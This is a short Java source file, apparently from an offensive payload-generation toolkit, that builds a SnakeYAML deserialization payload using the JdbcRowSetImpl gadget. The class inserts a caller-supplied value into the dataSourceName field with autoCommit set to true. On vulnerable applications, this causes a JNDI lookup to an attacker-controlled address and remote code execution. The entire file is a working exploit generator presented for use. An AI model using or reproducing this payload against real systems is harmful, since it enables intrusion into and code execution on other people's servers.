package cn.butler.snakeyaml.payloads;

import cn.butler.payloads.ObjectPayload;

public class JdbcRowSetImpl implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String yamlPayload = String.format("!!com.sun.rowset.JdbcRowSetImpl \n" +
            "  \"dataSourceName\": \"%s\"\n" +
            "  \"autoCommit\": true",command);
        return yamlPayload;
    }
    public static void main(final String[] args) throws Exception {
    }
}
